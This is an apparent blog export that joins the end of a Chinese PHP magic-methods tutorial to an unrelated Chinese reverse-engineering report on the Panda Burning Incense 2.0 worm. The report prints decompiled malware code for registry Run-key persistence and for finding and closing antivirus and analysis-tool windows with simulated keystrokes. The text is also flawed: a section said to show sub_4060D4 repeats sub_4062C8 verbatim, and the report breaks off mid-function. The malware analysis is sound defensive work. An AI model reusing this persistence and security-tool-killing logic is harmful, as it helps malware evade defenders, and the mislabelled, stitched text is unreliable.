此功能可以用于清理对象，并返回一个包含对象中所有应被序列化的变量名称的数组。 如果该方法未返回任何内容，则 NULL 被序列化，并产生一个 E_NOTICE 级别的错误。 注意： 1__sleep() 不能返回父类的私有成员的名字。这样做会产生一个 E_NOTICE 级别的错误。可以用 Serializable 接口来替代。 作用： 1__sleep() 方法常用于提交未提交的数据，或类似的清理操作。同时，如果有一些很大的对象，但不需要全部保存，这个功能就很好用。 具体请参考如下代码： 123456789101112131415161718192021222324252627&lt;?phpclass Person{ public $sex; public $name; public $age; public function __construct($name=&quot;&quot;, $age=25, $sex='男') { $this-&gt;name = $name; $this-&gt;age = $age; $this-&gt;sex = $sex; } /** * @return array */ public function __sleep() { echo &quot;当在类外部使用serialize()时会调用这里的__sleep()方法&lt;br&gt;&quot;; $this-&gt;name = base64_encode($this-&gt;name); return array('name', 'age'); // 这里必须返回一个数值，里边的元素表示返回的属性名称 }}$person = new Person('小明'); // 初始赋值echo serialize($person);echo '&lt;br/&gt;'; 代码运行结果： 12当在类外部使用serialize()时会调用这里的__sleep()方法O:6:&quot;Person&quot;:2:{s:4:&quot;name&quot;;s:8:&quot;5bCP5piO&quot;;s:3:&quot;age&quot;;i:25;} 十、 __wakeup()，执行unserialize()时，先会调用这个函数如果说 __sleep() 是白的，那么 __wakeup() 就是黑的了。 那么为什么呢？ 因为： 1与之相反，`unserialize()` 会检查是否存在一个 `__wakeup()` 方法。如果存在，则会先调用 `__wakeup` 方法，预先准备对象需要的资源。 作用： 1__wakeup() 经常用在反序列化操作中，例如重新建立数据库连接，或执行其它初始化操作。 还是看代码： 12345678910111213141516171819202122232425262728293031323334353637&lt;?phpclass Person{ public $sex; public $name; public $age; public function __construct($name=&quot;&quot;, $age=25, $sex='男') { $this-&gt;name = $name; $this-&gt;age = $age; $this-&gt;sex = $sex; } /** * @return array */ public function __sleep() { echo &quot;当在类外部使用serialize()时会调用这里的__sleep()方法&lt;br&gt;&quot;; $this-&gt;name = base64_encode($this-&gt;name); return array('name', 'age'); // 这里必须返回一个数值，里边的元素表示返回的属性名称 } /** * __wakeup */ public function __wakeup() { echo &quot;当在类外部使用unserialize()时会调用这里的__wakeup()方法&lt;br&gt;&quot;; $this-&gt;name = 2; $this-&gt;sex = '男'; // 这里不需要返回数组 }}$person = new Person('小明'); // 初始赋值var_dump(serialize($person));var_dump(unserialize(serialize($person))); 运行结果： 1234当在类外部使用serialize()时会调用这里的__sleep()方法string(58) &quot;O:6:&quot;Person&quot;:2:{s:4:&quot;name&quot;;s:8:&quot;5bCP5piO&quot;;s:3:&quot;age&quot;;i:25;}&quot; 当在类外部使用serialize()时会调用这里的__sleep()方法当在类外部使用unserialize()时会调用这里的__wakeup()方法object(Person)#2 (3) { [&quot;sex&quot;]=&gt; string(3) &quot;男&quot; [&quot;name&quot;]=&gt; int(2) [&quot;age&quot;]=&gt; int(25) } 十一、 __toString()，类被当成字符串时的回应方法作用： 1__toString() 方法用于一个类被当成字符串时应怎样回应。例如 `echo $obj;` 应该显示些什么。 注意： 1此方法必须返回一个字符串，否则将发出一条 `E_RECOVERABLE_ERROR` 级别的致命错误。 警告： 1不能在 __toString() 方法中抛出异常。这么做会导致致命错误。 代码： 12345678910111213141516171819202122&lt;?phpclass Person{ public $sex; public $name; public $age; public function __construct($name=&quot;&quot;, $age=25, $sex='男') { $this-&gt;name = $name; $this-&gt;age = $age; $this-&gt;sex = $sex; } public function __toString() { return 'go go go'; }}$person = new Person('小明'); // 初始赋值echo $person; 结果： 1go go go 那么如果类中没有 __toString() 这个魔术方法运行会发生什么呢？让我们来测试下： 代码： 123456789101112131415161718&lt;?phpclass Person{ public $sex; public $name; public $age; public function __construct($name=&quot;&quot;, $age=25, $sex='男') { $this-&gt;name = $name; $this-&gt;age = $age; $this-&gt;sex = $sex; } }$person = new Person('小明'); // 初始赋值echo $person; 结果： 1Catchable fatal error: Object of class Person could not be converted to string in D:\\phpStudy\\WWW\\test\\index.php on line 18 很明显，页面报了一个致命错误，这是语法所不允许的。 十二、 __invoke()，调用函数的方式调用一个对象时的回应方法作用： 1当尝试以调用函数的方式调用一个对象时，__invoke() 方法会被自动调用。 注意： 1本特性只在 PHP 5.3.0 及以上版本有效。 直接上代码： 12345678910111213141516171819202122&lt;?phpclass Person{ public $sex; public $name; public $age; public function __construct($name=&quot;&quot;, $age=25, $sex='男') { $this-&gt;name = $name; $this-&gt;age = $age; $this-&gt;sex = $sex; } public function __invoke() { echo '这可是一个对象哦'; }}$person = new Person('小明'); // 初始赋值$person(); 查看运行结果： 1这可是一个对象哦 当然，如果你执意要将对象当函数方法使用，那么会得到下面结果： 1Fatal error: Function name must be a string in D:\\phpStudy\\WWW\\test\\index.php on line 18 十三、 __set_state()，调用var_export()导出类时，此静态方法会被调用。作用： 1自 PHP 5.1.0 起，当调用 var_export() 导出类时，此静态方法会被自动调用。 参数： 1本方法的唯一参数是一个数组，其中包含按 array('property' =&gt; value, ...) 格式排列的类属性。 下面我们先来看看在没有加 __set_state() 情况按下，代码及运行结果如何： 上代码： 123456789101112131415161718&lt;?phpclass Person{ public $sex; public $name; public $age; public function __construct($name=&quot;&quot;, $age=25, $sex='男') { $this-&gt;name = $name; $this-&gt;age = $age; $this-&gt;sex = $sex; }}$person = new Person('小明'); // 初始赋值var_export($person); 看结果： 1Person::__set_state(array( 'sex' =&gt; '男', 'name' =&gt; '小明', 'age' =&gt; 25, )) 很明显，将对象中的属性都打印出来了 加了 __set_state() 之后： 继续上代码： 1234567891011121314151617181920212223242526&lt;?phpclass Person{ public $sex; public $name; public $age; public function __construct($name=&quot;&quot;, $age=25, $sex='男') { $this-&gt;name = $name; $this-&gt;age = $age; $this-&gt;sex = $sex; } public static function __set_state($an_array) { $a = new Person(); $a-&gt;name = $an_array['name']; return $a; }}$person = new Person('小明'); // 初始赋值$person-&gt;name = '小红';var_export($person); 继续看结果： 1Person::__set_state(array( 'sex' =&gt; '男', 'name' =&gt; '小红', 'age' =&gt; 25, )) 十四、 __clone()，当对象复制完成时调用在多数情况下，我们并不需要完全复制一个对象来获得其中属性。但有一个情况下确实需要：如果你有一个 GTK 窗口对象，该对象持有窗口相关的资源。你可能会想复制一个新的窗口，保持所有属性与原来的窗口相同，但必须是一个新的对象（因为如果不是新的对象，那么一个窗口中的改变就会影响到另一个窗口）。还有一种情况：如果对象 A 中保存着对象 B 的引用，当你复制对象 A 时，你想其中使用的对象不再是对象 B 而是 B 的一个副本，那么你必须得到对象 A 的一个副本。 作用： 1对象复制可以通过 clone 关键字来完成（如果可能，这将调用对象的 __clone() 方法）。对象中的 __clone() 方法不能被直接调用。 语法： 1$copy_of_object = clone $object; 注意： 123当对象被复制后，PHP 5 会对对象的所有属性执行一个浅复制（shallow copy）。所有的引用属性 仍然会是一个指向原来的变量的引用。当复制完成时，如果定义了 __clone() 方法，则新创建的对象（复制生成的对象）中的 __clone() 方法会被调用，可用于修改属性的值（如果有必要的话）。 看代码： 1234567891011121314151617181920212223242526272829&lt;?phpclass Person{ public $sex; public $name; public $age; public function __construct($name=&quot;&quot;, $age=25, $sex='男') { $this-&gt;name = $name; $this-&gt;age = $age; $this-&gt;sex = $sex; } public function __clone() { echo __METHOD__.&quot;你正在克隆对象&lt;br&gt;&quot;; }}$person = new Person('小明'); // 初始赋值$person2 = clone $person;var_dump('persion1:');var_dump($person);echo '&lt;br&gt;';var_dump('persion2:');var_dump($person2); 看结果： 123Person::__clone你正在克隆对象string(9) &quot;persion1:&quot; object(Person)#1 (3) { [&quot;sex&quot;]=&gt; string(3) &quot;男&quot; [&quot;name&quot;]=&gt; string(6) &quot;小明&quot; [&quot;age&quot;]=&gt; int(25) } string(9) &quot;persion2:&quot; object(Person)#2 (3) { [&quot;sex&quot;]=&gt; string(3) &quot;男&quot; [&quot;name&quot;]=&gt; string(6) &quot;小明&quot; [&quot;age&quot;]=&gt; int(25) } 克隆成功。 十五、__autoload()，尝试加载未定义的类作用： 1你可以通过定义这个函数来启用类的自动加载。 在魔术函数 __autoload() 方法出现以前，如果你要在一个程序文件中实例化100个对象，那么你必须用include或者require包含进来100个类文件，或者你把这100个类定义在同一个类文件中 —— 相信这个文件一定会非常大，然后你就痛苦了。 但是有了 __autoload() 方法，以后就不必为此大伤脑筋了，这个类会在你实例化对象之前自动加载制定的文件。 还是通过例子来看看吧： 先看看以往的方式： 123456789101112131415161718/** * 文件non_autoload.php */ require_once('project/class/A.php'); require_once('project/class/B.php'); require_once('project/class/C.php'); if (条件A) { $a = new A(); $b = new B(); $c = new C(); // … 业务逻辑 } else if (条件B) { $a = newA(); $b = new B(); // … 业务逻辑 } 看到了吗？不用100个，只是3个看起来就有点烦了。而且这样就会有一个问题：如果脚本执行“条件B”这个分支时，C.php这个文件其实没有必要包含。因为，任何一个被包含的文件，无论是否使用，均会被php引擎编译。如果不使用，却被编译，这样可以被视作一种资源浪费。更进一步，如果C.php包含了D.php，D.php包含了E.php。并且大部分情况都执行“条件B”分支，那么就会浪费一部分资源去编译C.php,D.php,E.php三个“无用”的文件。 那么如果使用 __autoload() 方式呢？ 1234567891011121314151617181920/** * 文件autoload_demo.php */ function __autoload($className) { $filePath = “project/class/{$className}.php”; if (is_readable($filePath)) { require($filePath); } } if (条件A) { $a = new A(); $b = new B(); $c = new C(); // … 业务逻辑 } else if (条件B) { $a = newA(); $b = new B(); // … 业务逻辑 } ok,不论效率怎么用，最起码界面看起来舒服多了，没有太多冗余的代。 再来看看这里的效率如何，我们分析下： 当php引擎第一次使用类A，但是找不到时，会自动调用 __autoload 方法，并将类名“A”作为参数传入。所以，我们在 __autoload() 中需要的做的就是根据类名，找到相应的文件，并包含进来，如果我们的方法也找不到，那么php引擎就会报错了。 注意： 1这里可以只用require，因为一旦包含进来后，php引擎再遇到类A时，将不会调用__autoload，而是直接使用内存中的类A，不会导致多次包含。 扩展： 1其实php发展到今天，已经有将 `spl_autoload_register` — 注册给定的函数作为 __autoload 的实现了，但是这个不在啊本文讲解之内，有兴趣可以自行看手册。 十六、__debugInfo()，打印所需调试信息注意： 1该方法在PHP 5.6.0及其以上版本才可以用，如果你发现使用无效或者报错，请查看啊你的版本。 看代码： 12345678910111213141516171819&lt;?phpclass C { private $prop; public function __construct($val) { $this-&gt;prop = $val; } /** * @return array */ public function __debugInfo() { return [ 'propSquared' =&gt; $this-&gt;prop ** 2, ]; }}var_dump(new C(42)); 结果： 1object(C)#1 (1) { [&quot;propSquared&quot;]=&gt; int(1764) } 再次注意： 1这里的 `**` 是乘方的意思，也是在PHP5.6.0及其以上才可以使用，详情请查看PHP手册","link":"/2025/12/11/php%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95/"},{"title":"","text":"传统病毒反分析思路 前言本文对传统病毒（熊猫烧香2.0）进行了系统性逆向分析。该病毒活跃于2006–2007年，曾在中国造成大规模感染，其核心特征包括：通过U盘和局域网自动传播、感染可执行文件并替换桌面图标为“熊猫烧香”、强力对抗杀毒软件、以及多重持久化机制。本报告详细剖析了其注册表自启动、窗口检测关闭安全工具、网络共享枚举、移动存储自动运行等关键技术模块，并结合现代安全视角评估其当前威胁等级，同时提供完整的应急处置与清除方案，为理解传统蠕虫病毒的攻击范式及防御演进提供重要参考。 熊猫烧香2.01. 基本信息文件名: setup.exe 文件哈希值: MD5: ad41ec81ab55c17397d3d6039752b0fd SHA256: aee99bc628b7c16a418560d4712f7dabfe8c273b4b78d8dbf804ccd7b6ea15e1 CRC32: 0x902e661b 文件大小: 59KB 2. 病毒特征通过逆向分析，确认该样本是熊猫烧香2.0病毒，具有以下特征： 2.1 进程与服务 创建恶意进程 spoclsv.exe 并将其写入 drivers 目录 使用 Windows 系统服务名称伪装自身 2.2 自启动机制 修改注册表 SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run 创建 Desktop_.ini 文件实现持久化 在所有用户的启动目录添加恶意程序 创建 autorun.inf 文件实现U盘等移动存储设备自动运行 sub_4052CC–Windows 注册表写入操作，主要用于向指定注册表路径写入一个字符串值（REG_SZ），实现持久化 1234567891011121314151617LSTATUS __userpurge sub_4052CC@&lt;eax&gt;(LPCSTR lpValueName@&lt;ecx&gt;, LPCSTR lpSubKey@&lt;edx&gt;, HKEY hKey@&lt;eax&gt;, BYTE *lpData)//lpValueName要创建的注册表的值名（如 &quot;MyBackdoor&quot;）//LPCSTR lpSubKey@&lt;edx&gt;子健路径（如 &quot;Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run&quot;）//HKEY hKey@&lt;eax&gt; [in] 根键（如 HKEY_CURRENT_USER 或 HKEY_LOCAL_MACHINE）//BYTE *lpData [in] 要写入的数据（通常是字符串，如 &quot;C:\\\\malware.exe&quot;）{ int v5; // eax DWORD dwDisposition; // [esp+8h] [ebp-8h] BYREF HKEY phkResult; // [esp+Ch] [ebp-4h] BYREF phkResult = 0; dwDisposition = 1; RegCreateKeyExA(hKey, lpSubKey, 0, 0, 0, 0xF003Fu, 0, &amp;phkResult, &amp;dwDisposition);//创建打开注册表子键 v5 = sub_4052B4(); //获取数据长度 RegSetValueExA(phkResult, lpValueName, 0, 1u, lpData, v5 + 1);//写入注册表值 return RegCloseKey_0(phkResult); //关闭句柄并返回} 123456上面的详细流程通过 RegCreateKeyExA 创建注册表项操作路径： Software\\Microsoft\\Windows\\CurrentVersion\\Run设置 svcshare 键值指向病毒程序使用 RegSetValueExA 写入键值数据最后通过 RegCloseKey_0 关闭注册表句柄 启动文件夹自启动 相关地址 ：0x40a584、0x40a610、0x40a640 字符串引用 ： Start Menu\\Programs\\Startup 机制 ：将病毒文件复制到系统启动文件夹，实现开机自动运行 2.3 反杀毒能力 检测并终止多种杀毒软件进程，包括： 瑞星系列: Ravmond.exe, CCenter.exe, RavTask.exe 等 金山系列: KVXP.kxp, KvMonXP.kxp 等 诺顿系列: Symantec AntiVirus 相关进程 McAfee、NOD32等其他安全软件 禁用任务管理器和注册表编辑器 修改系统设置隐藏文件 sub_4062C8–杀毒软件检测与终止 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199int __stdcall sub_4062C8(){ HWND hWndChildAfter; // ebx HWND hWndParent; // edi HWND hWndParent_1; // edi HWND hWndParent_2; // eax HWND hWnd; // eax BYTE bScan; // al BYTE bScan_1; // al BYTE bScan_2; // al BYTE bScan_3; // al BYTE bScan_4; // al BYTE bScan_5; // al BYTE bScan_6; // al BYTE bScan_7; // al unsigned int v14[6]; // [esp-Ch] [ebp-108h] BYREF CHAR String[101]; // [esp+97h] [ebp-65h] BYREF int savedregs; // [esp+FCh] [ebp+0h] BYREF v14[2] = (unsigned int)&amp;savedregs; v14[1] = (unsigned int)&amp;loc_406BF1; v14[0] = (unsigned int)NtCurrentTeb()-&gt;NtTib.ExceptionList; __writefsdword(0, (unsigned int)v14); sub_406218(); hWndChildAfter = 0; hWndParent = GetDesktopWindow(); do { hWndChildAfter = FindWindowExA(hWndParent, hWndChildAfter, 0, 0); GetWindowTextA(hWndChildAfter, String, 101); sub_403EB4(101, String); if ( sub_4041B4() ) PostMessageA(hWndChildAfter, 0x12u, 0, 0); sub_403EB4(101, String); if ( sub_4041B4() ) PostMessageA(hWndChildAfter, 0x12u, 0, 0); sub_403EB4(101, String); if ( sub_4041B4() ) PostMessageA(hWndChildAfter, 0x12u, 0, 0); sub_403EB4(101, String); if ( sub_4041B4() ) PostMessageA(hWndChildAfter, 0x12u, 0, 0); sub_403EB4(101, String); if ( sub_4041B4() ) PostMessageA(hWndChildAfter, 0x12u, 0, 0); sub_403EB4(101, String); if ( sub_4041B4() ) PostMessageA(hWndChildAfter, 0x12u, 0, 0); sub_403EB4(101, String); if ( sub_4041B4() ) PostMessageA(hWndChildAfter, 0x12u, 0, 0); sub_403EB4(101, String); if ( sub_4041B4() ) PostMessageA(hWndChildAfter, 0x12u, 0, 0); sub_403EB4(101, String); if ( sub_4041B4() ) PostMessageA(hWndChildAfter, 0x12u, 0, 0); sub_403EB4(101, String); if ( sub_4041B4() ) PostMessageA(hWndChildAfter, 0x12u, 0, 0); sub_403EB4(101, String); if ( sub_4041B4() ) PostMessageA(hWndChildAfter, 0x12u, 0, 0); sub_403EB4(101, String); if ( sub_4041B4() ) PostMessageA(hWndChildAfter, 0x12u, 0, 0); sub_403EB4(101, String); if ( sub_4041B4() ) PostMessageA(hWndChildAfter, 0x12u, 0, 0); sub_403EB4(101, String); if ( sub_4041B4() ) PostMessageA(hWndChildAfter, 0x12u, 0, 0); sub_403EB4(101, String); if ( sub_4041B4() ) PostMessageA(hWndChildAfter, 0x12u, 0, 0); sub_403EB4(101, String); if ( sub_4041B4() ) PostMessageA(hWndChildAfter, 0x12u, 0, 0); sub_403EB4(101, String); if ( sub_4041B4() ) PostMessageA(hWndChildAfter, 0x12u, 0, 0); sub_403EB4(101, String); if ( sub_4041B4() ) PostMessageA(hWndChildAfter, 0x12u, 0, 0); sub_403EB4(101, String); if ( sub_4041B4() ) PostMessageA(hWndChildAfter, 0x12u, 0, 0); sub_403EB4(101, String); if ( sub_4041B4() ) PostMessageA(hWndChildAfter, 0x12u, 0, 0); sub_403EB4(101, String); if ( sub_4041B4() ) PostMessageA(hWndChildAfter, 0x12u, 0, 0); sub_403EB4(101, String); if ( sub_4041B4() ) PostMessageA(hWndChildAfter, 0x12u, 0, 0); sub_403EB4(101, String); if ( sub_4041B4() ) PostMessageA(hWndChildAfter, 0x12u, 0, 0); sub_403EB4(101, String); if ( sub_4041B4() ) PostMessageA(hWndChildAfter, 0x12u, 0, 0); sub_403EB4(101, String); if ( sub_4041B4() ) PostMessageA(hWndChildAfter, 0x12u, 0, 0); sub_403EB4(101, String); if ( sub_4041B4() ) PostMessageA(hWndChildAfter, 0x12u, 0, 0); sub_403EB4(101, String); if ( sub_4041B4() ) PostMessageA(hWndChildAfter, 0x12u, 0, 0); sub_403EB4(101, String); if ( sub_4041B4() ) PostMessageA(hWndChildAfter, 0x12u, 0, 0); sub_403EB4(101, String); if ( sub_4041B4() ) PostMessageA(hWndChildAfter, 0x12u, 0, 0); sub_403EB4(101, String); if ( sub_4041B4() ) PostMessageA(hWndChildAfter, 0x12u, 0, 0); sub_403EB4(101, String); if ( sub_4041B4() ) PostMessageA(hWndChildAfter, 0x12u, 0, 0); sub_403EB4(101, String); if ( sub_4041B4() ) PostMessageA(hWndChildAfter, 0x12u, 0, 0); sub_403EB4(101, String); if ( sub_4041B4() ) PostMessageA(hWndChildAfter, 0x12u, 0, 0); } while ( hWndChildAfter ); hWndParent_1 = GetDesktopWindow(); do { hWndChildAfter = FindWindowExA(hWndParent_1, hWndChildAfter, 0, 0); hWndParent_2 = FindWindowExA(hWndChildAfter, 0, &quot;msctls_statusbar32&quot;, 0); hWnd = FindWindowExA(hWndParent_2, 0, 0, 0); GetWindowTextA(hWnd, String, 101); sub_403EB4(101, String); if ( sub_4041B4() ) { PostMessageA(hWndChildAfter, 0x12u, 0, 0); bScan = MapVirtualKeyA(0x11u, 0); keybd_event(0x11u, bScan, 0, 0); bScan_1 = MapVirtualKeyA(0x12u, 0); keybd_event(0x12u, bScan_1, 0, 0); bScan_2 = MapVirtualKeyA(0x44u, 0); keybd_event(0x44u, bScan_2, 0, 0); bScan_3 = MapVirtualKeyA(0x44u, 0); keybd_event(0x44u, bScan_3, 2u, 0); bScan_4 = MapVirtualKeyA(0x11u, 0); keybd_event(0x11u, bScan_4, 2u, 0); bScan_5 = MapVirtualKeyA(0x12u, 0); keybd_event(0x12u, bScan_5, 2u, 0); if ( FindWindowA(0, &quot;IceSword&quot;) ) { bScan_6 = MapVirtualKeyA(0xDu, 0); keybd_event(0xDu, bScan_6, 0, 0); bScan_7 = MapVirtualKeyA(0xDu, 0); keybd_event(0xDu, bScan_7, 2u, 0); } } } while ( hWndChildAfter ); sub_4060D4(); sub_4060D4(); sub_4060D4(); sub_4060D4(); sub_4060D4(); sub_4060D4(); sub_4060D4(); sub_4060D4(); sub_4060D4(); sub_4060D4(); sub_4060D4(); sub_4060D4(); sub_4060D4(); sub_4060D4(); sub_4060D4(); sub_4060D4(); sub_4060D4(); sub_4060D4(); sub_4060D4(); sub_4060D4(); sub_4060D4(); sub_4060D4(); sub_4060D4(); sub_4060D4(); sub_4060D4(); sub_4060D4(); sub_4060D4(); sub_4060D4(); sub_4060D4(); sub_4060D4(); sub_4060D4(); sub_4060D4(); __writefsdword(0, v14[0]); return sub_403C68(&amp;loc_406BF8);} 1234567sub_4041B4() 字符串匹配函数，检测窗口标题是否包含：&quot;任务管理器&quot;&quot;Process Explorer&quot;&quot;ProcMon&quot;&quot;Wireshark&quot;&quot;调试器&quot;&quot;IceSword&quot;（古老的著名内核工具，现在win10，11都不用这个了）专门检测 IceSword 并模拟按键（简单来说就是不让你打开得得功能） sub_4060D4–Windows 异常处理（SEH）框架 + 资源枚举循环 的函数，用于枚举系统资源（如窗口、进程、文件、驱动） 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199int __stdcall sub_4062C8(){ HWND hWndChildAfter; // ebx HWND hWndParent; // edi HWND hWndParent_1; // edi HWND hWndParent_2; // eax HWND hWnd; // eax BYTE bScan; // al BYTE bScan_1; // al BYTE bScan_2; // al BYTE bScan_3; // al BYTE bScan_4; // al BYTE bScan_5; // al BYTE bScan_6; // al BYTE bScan_7; // al unsigned int v14[6]; // [esp-Ch] [ebp-108h] BYREF CHAR String[101]; // [esp+97h] [ebp-65h] BYREF int savedregs; // [esp+FCh] [ebp+0h] BYREF v14[2] = (unsigned int)&amp;savedregs; v14[1] = (unsigned int)&amp;loc_406BF1; v14[0] = (unsigned int)NtCurrentTeb()-&gt;NtTib.ExceptionList; __writefsdword(0, (unsigned int)v14); sub_406218(); hWndChildAfter = 0; hWndParent = GetDesktopWindow(); do { hWndChildAfter = FindWindowExA(hWndParent, hWndChildAfter, 0, 0); GetWindowTextA(hWndChildAfter, String, 101); sub_403EB4(101, String); if ( sub_4041B4() ) PostMessageA(hWndChildAfter, 0x12u, 0, 0); sub_403EB4(101, String); if ( sub_4041B4() ) PostMessageA(hWndChildAfter, 0x12u, 0, 0); sub_403EB4(101, String); if ( sub_4041B4() ) PostMessageA(hWndChildAfter, 0x12u, 0, 0); sub_403EB4(101, String); if ( sub_4041B4() ) PostMessageA(hWndChildAfter, 0x12u, 0, 0); sub_403EB4(101, String); if ( sub_4041B4() ) PostMessageA(hWndChildAfter, 0x12u, 0, 0); sub_403EB4(101, String); if ( sub_4041B4() ) PostMessageA(hWndChildAfter, 0x12u, 0, 0); sub_403EB4(101, String); if ( sub_4041B4() ) PostMessageA(hWndChildAfter, 0x12u, 0, 0); sub_403EB4(101, String); if ( sub_4041B4() ) PostMessageA(hWndChildAfter, 0x12u, 0, 0); sub_403EB4(101, String); if ( sub_4041B4() ) PostMessageA(hWndChildAfter, 0x12u, 0, 0); sub_403EB4(101, String); if ( sub_4041B4() ) PostMessageA(hWndChildAfter, 0x12u, 0, 0); sub_403EB4(101, String); if ( sub_4041B4() ) PostMessageA(hWndChildAfter, 0x12u, 0, 0); sub_403EB4(101, String); if ( sub_4041B4() ) PostMessageA(hWndChildAfter, 0x12u, 0, 0); sub_403EB4(101, String); if ( sub_4041B4() ) PostMessageA(hWndChildAfter, 0x12u, 0, 0); sub_403EB4(101, String); if ( sub_4041B4() ) PostMessageA(hWndChildAfter, 0x12u, 0, 0); sub_403EB4(101, String); if ( sub_4041B4() ) PostMessageA(hWndChildAfter, 0x12u, 0, 0); sub_403EB4(101, String); if ( sub_4041B4() ) PostMessageA(hWndChildAfter, 0x12u, 0, 0); sub_403EB4(101, String); if ( sub_4041B4() ) PostMessageA(hWndChildAfter, 0x12u, 0, 0); sub_403EB4(101, String); if ( sub_4041B4() ) PostMessageA(hWndChildAfter, 0x12u, 0, 0); sub_403EB4(101, String); if ( sub_4041B4() ) PostMessageA(hWndChildAfter, 0x12u, 0, 0); sub_403EB4(101, String); if ( sub_4041B4() ) PostMessageA(hWndChildAfter, 0x12u, 0, 0); sub_403EB4(101, String); if ( sub_4041B4() ) PostMessageA(hWndChildAfter, 0x12u, 0, 0); sub_403EB4(101, String); if ( sub_4041B4() ) PostMessageA(hWndChildAfter, 0x12u, 0, 0); sub_403EB4(101, String); if ( sub_4041B4() ) PostMessageA(hWndChildAfter, 0x12u, 0, 0); sub_403EB4(101, String); if ( sub_4041B4() ) PostMessageA(hWndChildAfter, 0x12u, 0, 0); sub_403EB4(101, String); if ( sub_4041B4() ) PostMessageA(hWndChildAfter, 0x12u, 0, 0); sub_403EB4(101, String); if ( sub_4041B4() ) PostMessageA(hWndChildAfter, 0x12u, 0, 0); sub_403EB4(101, String); if ( sub_4041B4() ) PostMessageA(hWndChildAfter, 0x12u, 0, 0); sub_403EB4(101, String); if ( sub_4041B4() ) PostMessageA(hWndChildAfter, 0x12u, 0, 0); sub_403EB4(101, String); if ( sub_4041B4() ) PostMessageA(hWndChildAfter, 0x12u, 0, 0); sub_403EB4(101, String); if ( sub_4041B4() ) PostMessageA(hWndChildAfter, 0x12u, 0, 0); sub_403EB4(101, String); if ( sub_4041B4() ) PostMessageA(hWndChildAfter, 0x12u, 0, 0); sub_403EB4(101, String); if ( sub_4041B4() ) PostMessageA(hWndChildAfter, 0x12u, 0, 0); sub_403EB4(101, String); if ( sub_4041B4() ) PostMessageA(hWndChildAfter, 0x12u, 0, 0); } while ( hWndChildAfter ); hWndParent_1 = GetDesktopWindow(); do { hWndChildAfter = FindWindowExA(hWndParent_1, hWndChildAfter, 0, 0); hWndParent_2 = FindWindowExA(hWndChildAfter, 0, &quot;msctls_statusbar32&quot;, 0); hWnd = FindWindowExA(hWndParent_2, 0, 0, 0); GetWindowTextA(hWnd, String, 101); sub_403EB4(101, String); if ( sub_4041B4() ) { PostMessageA(hWndChildAfter, 0x12u, 0, 0); bScan = MapVirtualKeyA(0x11u, 0); keybd_event(0x11u, bScan, 0, 0); bScan_1 = MapVirtualKeyA(0x12u, 0); keybd_event(0x12u, bScan_1, 0, 0); bScan_2 = MapVirtualKeyA(0x44u, 0); keybd_event(0x44u, bScan_2, 0, 0); bScan_3 = MapVirtualKeyA(0x44u, 0); keybd_event(0x44u, bScan_3, 2u, 0); bScan_4 = MapVirtualKeyA(0x11u, 0); keybd_event(0x11u, bScan_4, 2u, 0); bScan_5 = MapVirtualKeyA(0x12u, 0); keybd_event(0x12u, bScan_5, 2u, 0); if ( FindWindowA(0, &quot;IceSword&quot;) ) { bScan_6 = MapVirtualKeyA(0xDu, 0); keybd_event(0xDu, bScan_6, 0, 0); bScan_7 = MapVirtualKeyA(0xDu, 0); keybd_event(0xDu, bScan_7, 2u, 0); } } } while ( hWndChildAfter ); sub_4060D4(); sub_4060D4(); sub_4060D4(); sub_4060D4(); sub_4060D4(); sub_4060D4(); sub_4060D4(); sub_4060D4(); sub_4060D4(); sub_4060D4(); sub_4060D4(); sub_4060D4(); sub_4060D4(); sub_4060D4(); sub_4060D4(); sub_4060D4(); sub_4060D4(); sub_4060D4(); sub_4060D4(); sub_4060D4(); sub_4060D4(); sub_4060D4(); sub_4060D4(); sub_4060D4(); sub_4060D4(); sub_4060D4(); sub_4060D4(); sub_4060D4(); sub_4060D4(); sub_4060D4(); sub_4060D4(); sub_4060D4(); __writefsdword(0, v14[0]); return sub_403C68(&amp;loc_406BF8);} 使用 FindWindowExA 枚举系统窗口 通过 GetWindowTextA 获取窗口标题 调用 sub_4041B4 检测窗口标题中的杀毒软件特征字符串 当检测到杀毒软件时，使用 PostMessageA 发送 WM_DESTROY （0x12）消息关闭窗口 这些个方法已经过时了 12345678910IceSword 是 2005–2010 年流行的内核工具，早就已经停止更新，现代 Windows（Win10/11）根本无法运行行为特征库中早已收录：FindWindow + PostMessage(WM_CLOSE) + &quot;任务管理器&quot;keybd_event(VK_CONTROL) + VK_MENU + 'D'高频调用 CreateToolhelp32Snapshot + RegSetValueEx云沙箱（如 ANY.RUN、Hybrid Analysis）会：模拟打开“任务管理器”窗口观察样本是否尝试关闭它→ 直接标记为恶意 病毒内置了多种杀毒软件的特征字符串进行检测： NOD32 Symantec Mcshield navapsvc VirusScan KAV (卡巴斯基) 键盘模拟对抗 使用 keybd_event 模拟键盘操作来干扰杀毒软件的正常运行 通过异常处理机制避免被杀毒软件检测到 接下来就可以操作文件感染（桌面全变成熊猫烧香图标），然后去进程注入 1234567891011121314151617181920212223242526272829303132333435363738394041424344int *__usercall sub_4060D4@&lt;eax&gt;(int a1@&lt;eax&gt;){ int *p_n296; // ebx void *hObject; // esi bool i; // al char v4; // zf unsigned int v6[10]; // [esp-Ch] [ebp-154h] BYREF int n296; // [esp+1Ch] [ebp-12Ch] BYREF _DWORD v8[66]; // [esp+40h] [ebp-108h] BYREF int savedregs; // [esp+148h] [ebp+0h] BYREF memset(&amp;v6[5], 0, 20); v8[65] = a1; sub_4040BC(); p_n296 = &amp;n296; v6[2] = (unsigned int)&amp;savedregs; v6[1] = (unsigned int)&amp;loc_406206; v6[0] = (unsigned int)NtCurrentTeb()-&gt;NtTib.ExceptionList; __writefsdword(0, (unsigned int)v6); hObject = (void *)sub_405028(); n296 = 296; for ( i = sub_405048() != 0; i; i = sub_405068() != 0 ) { sub_406028(); sub_405FA8(); sub_403EB4(260, v8); 